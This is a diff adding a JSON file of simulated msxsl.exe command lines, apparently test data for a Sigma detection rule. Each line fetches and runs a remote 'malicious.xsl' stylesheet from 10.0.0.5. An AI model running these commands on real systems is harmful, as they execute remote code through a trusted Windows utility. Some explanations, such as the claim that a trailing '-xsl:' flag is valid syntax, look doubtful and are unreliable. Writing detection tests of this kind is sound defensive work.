@@ -1,0 +1,18 @@
+[
+  {
+    "output": "msxsl.exe local.xml http://10.0.0.5/malicious.xsl",
+    "explanation": "The original command uses a UNC path, but the Sigma rule detects the use of 'http' in the command line. This simulated command replaces the UNC path with an HTTP URL to trigger the rule."
+  },
+  {
+    "output": "msxsl.exe local.xml http://10.0.0.5/malicious.xsl -xsl:",
+    "explanation": "This command includes an explicit '-xsl' flag to specify the XSL file, which is valid syntax for msxsl.exe and still includes the 'http' keyword to trigger the Sigma rule."
+  },
+  {
+    "output": "msxsl.exe local.xml \"http://10.0.0.5/malicious.xsl\"",
+    "explanation": "Quotes are inserted around the URL using insertion technique. The command remains valid and still includes the 'http' keyword to trigger the Sigma rule."
+  },
+  {
+    "output": "msxsl.exe local.xml http://10.0.0.5/malicious.xsl -o output.xml",
+    "explanation": "An additional '-o' flag is added to specify an output file. This is valid syntax and does not affect the detection based on the presence of 'http' in the command line."
+  }
+]
